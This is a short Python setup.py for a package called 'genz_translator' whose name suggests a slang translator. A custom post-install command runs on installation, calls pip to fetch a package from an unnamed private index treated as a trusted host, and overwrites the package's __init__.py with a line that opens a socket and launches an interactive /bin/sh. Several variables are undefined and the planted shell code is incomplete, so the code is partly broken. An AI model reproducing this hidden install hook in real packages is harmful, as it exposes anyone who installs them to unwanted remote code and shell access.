from setuptools import setup
from setuptools.command.install import install
import os, socket, subprocess

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        os.system('pip3 install ' + PACKAGE_NAME + ' --trusted-host ' + HOST + ' --index-url ' + PRIVATE_INDEX)
        f = open(self.install_lib + '/genz_translator/__init__.py', 'w')
        f.write('socket.socket(socket.AF_INET,socket.SOCK_STREAM); subprocess.call(["/bin/sh", "-i"])')

setup(name='genz_translator', cmdclass={'install': PostInstallCommand})
